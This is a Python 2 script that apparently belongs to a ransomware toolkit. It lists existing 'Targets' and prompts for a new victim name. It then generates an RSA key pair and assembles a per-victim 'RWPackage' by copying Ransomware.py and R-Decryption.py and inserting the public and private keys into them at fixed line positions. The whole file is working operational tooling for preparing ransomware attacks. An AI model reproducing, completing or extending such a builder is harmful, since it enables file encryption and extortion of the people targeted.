import Crypto, ast, os, sys, glob, socket, random, struct, subprocess, stat
from Crypto.PublicKey import RSA
from Crypto import Random
from os.path import expanduser, join
from Tkinter import *
from GenAsymKeys import GenAsymKeys
from shutil import copyfile
from stat import *

print("\nCURRENT LIST OF TARGETS:\n")

home = os.getcwd()

targets = glob.glob(os.path.join(home, 'Targets', '*'))
for path in targets:
    print("\t" + path)

name = raw_input("\nName of the new target?: ")
file_path = os.path.join(home, 'Targets', name)

GenAsymKeys(file_path,name)

#getting the public key that was generated for this target
f = open (os.path.join(file_path, "publicKey.txt"), 'r')
#print(f.read())
key = RSA.importKey(f.read())
f.close()

key_str = key.exportKey('PEM')

#new directory so ransomware to be packaged without private key
rw_dir = os.path.join(file_path, 'RWPackage')
if not os.path.exists(rw_dir):
    os.makedirs(rw_dir)

f = open (os.path.join(file_path, 'publicKey.txt'), 'r')
pub_key = f.read()
f.close()

f = open (os.path.join(file_path, 'privateKey.txt'), 'r')
priv_key = f.read()
f.close()

rw_dir_d = os.path.join(rw_dir, 'R-Decryption.py')
copyfile(os.path.join(home, 'R-Decryption.py'), rw_dir_d)

rw_dir_e = os.path.join(rw_dir, 'Ransomware.py')
copyfile(os.path.join(home, 'Ransomware.py'), rw_dir_e)

f = open(rw_dir_d, "r")
contents = f.readlines()
f.close()

contents.insert(47, "    priv_key = \"\"\"" +  '    '.join(priv_key.splitlines(True)) + "\"\"\"\n\n")

f = open(rw_dir_d, "w")
contents = "".join(contents)
f.write(contents)
f.close()


f = open(rw_dir_e, "r")
contents = f.readlines()
f.close()

contents.insert(102, "    public_key = \"\"\"" +  '    '.join(pub_key.splitlines(True)) + "\"\"\"\n\n")

f = open(rw_dir_e, "w")
contents = "".join(contents)
f.write(contents)
f.close()
